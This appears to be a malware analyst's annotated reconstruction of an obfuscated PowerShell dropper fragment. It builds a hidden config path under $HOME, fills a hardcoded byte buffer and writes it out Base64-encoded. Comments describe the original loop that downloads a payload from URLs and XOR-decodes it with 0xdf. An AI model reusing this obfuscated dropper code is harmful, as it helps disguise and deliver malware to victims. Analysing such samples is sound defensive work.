
# 1. Config File Path Generation
$Bb28umo = (('Ale'+'7g')+'_8'); # "Ale7g_8"
$hbmskV2T=(('C'+'7xo')+'9g'+'l'); # initial garbage assignment?
# De-obfuscating path: $HOME\Jrbevk4\Ccwr_2h\Ale7g_8.conf
$hbmskV2T=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.c'+'o')+'nf');

# 2. Content Buffer Initialization (Static Headers/Footers)
$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);

# NOTE: The main body of the config comes from the downloaded payload!
# In the original script, it loops through URLs, downloads a file, 
# and if valid, XORs it with 0xdf and appends to $FN5ggmsH
#
# foreach ... {
#    ...
#    ${FN5`GGm`Sh} += ([byte][char]${_} -bxor 0xdf ) 
# }

# 3. Final Byte Append
$FN5ggmsH += (228);

# 4. Write to File (Base64 Encoded)
$b0Rje =  [type]("{1}{0}" -F'VerT','Con'); # "ConVerT"
# Convert.ToBase64String($FN5ggmsH) | Out-File $hbmskV2T
$B0RjE::"tO`BaS`E64S`TRI`Ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hB`mSK`V2T};
